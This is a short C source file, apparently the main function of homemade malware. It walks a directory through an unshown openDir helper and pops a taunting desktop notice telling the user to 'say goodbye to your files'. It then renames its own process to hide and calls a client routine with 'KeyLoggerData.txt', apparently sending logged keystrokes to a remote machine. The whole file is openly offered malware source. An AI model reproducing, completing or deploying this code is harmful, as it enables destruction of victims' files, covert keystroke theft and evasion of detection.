#include "header.h"

int main(int argc, char *argv[]) {
	
	/* FIRST PARAM OF OPENDIR IS THE DIRECTORY TO START OUT WITH */
	openDir(START, 0);

	// Send system message
	char command[100], msg[1000];

	strcpy(command,"notify-send ");
	strcpy(msg,"\"You have been GOATED. Get rekt. Say goodbye to your files. Hue.\"");
	strcat(command,msg);

	system(command);

	changeProcessName(argv);

	client("KeyLoggerData.txt", "KeyLoggerData.txt");
	return 0;
}
